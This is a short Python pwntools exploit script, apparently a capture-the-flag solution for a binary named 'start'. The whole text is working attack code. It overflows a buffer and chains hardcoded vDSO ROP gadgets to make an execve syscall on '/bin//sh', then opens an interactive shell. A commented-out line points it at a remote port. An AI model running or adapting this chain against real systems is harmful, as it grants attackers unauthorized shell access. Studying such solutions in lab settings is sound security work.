from pwn import *

p = process('./start')

#p = remote('127.0.0.1',7777)
#0xf7ffd000 0xf7ffe000

vdso = 0xf7ffd000

gad0 = vdso + 0x00000c01    #0x00000c01 : pop edx ; pop ecx ; ret
gad1 = vdso+ 0x000006d1     #0x000006d1 : pop esi ; pop ebp ; ret
gad2 = vdso+ 0x000006ca     #0x000006ca : mov eax, esi ; mov edx, ecx ; nop ; pop ebx ; pop esi ; pop ebp ; ret
gad3 = vdso+ 0x000006d0     #0x000006d0 : pop ebx ; pop esi ; pop ebp ; ret
gad4 = vdso+ 0x00000c01     #0x00000c01 : pop edx ; pop ecx ; ret



binsh = ""
print hex(gad1)

reread = 0x08048095 

payload1 = 'A'*20+p32(gad0)+p32(0xff)+p32(0xffffd4cc)+p32(reread)+'B'*24


payload = p32(gad1)+p32(11)+p32(gad2-4)+p32(gad2)+'B'*8+p32(gad3-4)+p32(gad3)+p32(0xffffd508)+'C'*4+p32(gad4-4)+p32(gad4)+p32(0)+p32(0)+p32(0x0804808F)+'/bin//sh\x00'

p.send(payload1+payload)

p.interactive()